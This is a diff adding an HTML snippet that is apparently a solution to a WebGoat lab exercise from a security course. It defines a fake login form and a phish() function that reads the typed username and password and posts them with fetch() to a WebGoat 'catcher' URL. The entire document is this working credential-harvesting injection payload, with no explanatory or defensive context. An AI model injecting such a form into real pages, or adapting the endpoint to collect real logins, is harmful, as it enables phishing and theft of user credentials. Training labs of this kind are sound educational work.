@@ -1,0 +1,18 @@
+<script>
+	function phish() {
+		var user = document.getElementById("ece568_2022s_user").value;
+		var password = document.getElementById("ece568_2022s_pw").value;
+		var url = `http://localhost:8010/WebGoat/catcher?PROPERTY=yes&phishingUsername=${user}&phishingPassword=${password}`;
+		fetch(url, {method: "POST"});
+	}
+</script>
+
+<form name="phishingForm">
+      <label for="ece568_2022s_user">Name:</label>
+      <input type="text" id="ece568_2022s_user" />
+
+      <label for="ece568_2022s_pw">Password:</label>
+      <input type="password" id="ece568_2022s_pw" />
+
+      <button type="submit" id="ece568_2022s_submit" onclick="phish()">Login</button>
+</form>
